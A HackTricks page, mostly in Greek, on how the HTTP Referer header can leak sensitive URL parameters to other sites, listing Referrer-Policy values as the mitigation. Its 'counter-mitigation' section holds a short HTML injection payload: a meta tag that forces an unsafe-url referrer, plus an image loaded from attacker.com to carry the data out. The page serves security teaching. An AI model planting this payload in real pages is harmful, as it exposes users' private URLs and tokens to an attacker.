{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Referrer headers and policy

Referrer είναι η κεφαλίδα που χρησιμοποιούν οι φυλλομετρητές για να υποδείξουν ποια ήταν η προηγούμενη σελίδα που επισκέφτηκαν.

## Ευαίσθητες πληροφορίες που διαρρέουν

Εάν σε κάποιο σημείο μέσα σε μια ιστοσελίδα οποιαδήποτε ευαίσθητη πληροφορία βρίσκεται σε παραμέτρους GET request, εάν η σελίδα περιέχει συνδέσμους σε εξωτερικές πηγές ή αν ένας επιτιθέμενος είναι σε θέση να κάνει/προτείνει (κοινωνική μηχανική) στον χρήστη να επισκεφθεί μια διεύθυνση URL που ελέγχεται από τον επιτιθέμενο. Θα μπορούσε να είναι σε θέση να εξάγει τις ευαίσθητες πληροφορίες μέσα στην τελευταία GET request.

## Mitigation

Μπορείτε να κάνετε τον φυλλομετρητή να ακολουθήσει μια **Referrer-policy** που θα μπορούσε να **αποφύγει** την αποστολή των ευαίσθητων πληροφοριών σε άλλες διαδικτυακές εφαρμογές:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας μια ετικέτα HTML meta (ο επιτιθέμενος χρειάζεται να εκμεταλλευτεί και μια ένεση HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Άμυνα

Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή διαδρομές στη διεύθυνση URL.


{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
